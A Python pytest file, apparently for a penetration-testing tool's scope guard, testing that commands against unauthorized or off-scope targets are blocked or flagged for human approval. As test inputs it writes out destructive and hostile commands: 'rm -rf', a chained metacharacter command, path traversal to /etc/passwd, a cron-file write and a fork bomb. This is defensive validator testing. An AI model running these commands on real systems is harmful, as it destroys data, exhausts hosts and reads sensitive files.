import pytest

from core.scope import ScopeGuard
from models.target import Target


def make_target(host="10.0.0.5", authorized=True):
    return Target(id="t1", host=host, authorized=authorized)


def test_comando_vacio_bloqueado():
    guard = ScopeGuard()
    v = guard.validate_command("   ", make_target())
    assert not v.approved
    assert "comando vacio" in v.reasons


def test_prefijo_denegado_bloqueado():
    guard = ScopeGuard(denied_prefixes=["rm -rf /", "shutdown"])
    v = guard.validate_command("shutdown -h now", make_target())
    assert not v.approved
    assert any("shutdown" in r for r in v.reasons)


def test_metacaracter_shell_bloqueado():
    guard = ScopeGuard()
    v = guard.validate_command("curl http://x; rm -rf /tmp", make_target())
    assert not v.approved
    assert any("metacaracter" in r for r in v.reasons)


def test_wrapper_ejecucion_arbitraria_bloqueado():
    guard = ScopeGuard()
    v = guard.validate_command("python -c \"print('x')\"", make_target())
    assert not v.approved
    assert any("ejecucion arbitraria" in r for r in v.reasons)


def test_base64_codificado_bloqueado():
    guard = ScopeGuard()
    v = guard.validate_command("echo aGVsbG8= | base64 -d", make_target())
    assert not v.approved
    assert any("codificado" in r for r in v.reasons)


def test_path_traversal_bloqueado():
    guard = ScopeGuard()
    v = guard.validate_command("curl --path-as-is http://x/../../etc/passwd", make_target())
    assert not v.approved
    assert any("traversal" in r for r in v.reasons)


def test_escritura_ruta_critica_bloqueado():
    guard = ScopeGuard()
    v = guard.validate_command("curl http://x -o /etc/cron.d/t", make_target())
    assert not v.approved
    assert any("ruta critica" in r for r in v.reasons)


def test_fork_bomb_bloqueado():
    guard = ScopeGuard()
    v = guard.validate_command(":(){ :|:& };:", make_target())
    assert not v.approved
    assert any("fork bomb" in r for r in v.reasons)


def test_target_no_autorizado_bloquea_comando():
    guard = ScopeGuard()
    v = guard.validate_command("curl http://x", make_target(authorized=False))
    assert not v.approved
    assert "target no autorizado" in v.reasons


def test_validate_target_no_autorizado():
    guard = ScopeGuard()
    assert not guard.validate_target(make_target(authorized=False))


def test_allowlist_hosts_bloquea_fuera_de_scope():
    guard = ScopeGuard(allowed_hosts=["app.test-lab.com"])
    assert guard.validate_target(make_target(host="app.test-lab.com"))
    assert not guard.validate_target(make_target(host="evil.com"))
    v = guard.validate_command("curl http://other.com/x", make_target(host="app.test-lab.com"))
    assert not v.approved
    assert any("fuera de scope" in r for r in v.reasons)


def test_allowlist_wildcard_subdominio():
    guard = ScopeGuard(allowed_hosts=["*.test-lab.com"])
    assert guard.validate_target(make_target(host="app.test-lab.com"))
    assert not guard.validate_target(make_target(host="test-lab.com"))


def test_hosts_dentro_de_scope_aprobados():
    guard = ScopeGuard(allowed_hosts=["app.test-lab.com"], denied_prefixes=[])
    v = guard.validate_command("curl http://app.test-lab.com/admin", make_target(host="app.test-lab.com"))
    assert v.approved


def test_approval_requerido():
    guard = ScopeGuard(require_approval_patterns=["shutdown"])
    v = guard.validate_command("curl http://x/shutdown", make_target())
    assert v.approved  # se aprueba...
    assert v.requires_approval  # ...pero exige aprobacion humana


def test_comando_normal_aprobado():
    guard = ScopeGuard()
    v = guard.validate_command("curl -sk https://app.test-lab.com/admin", make_target())
    assert v.approved
    assert not v.requires_approval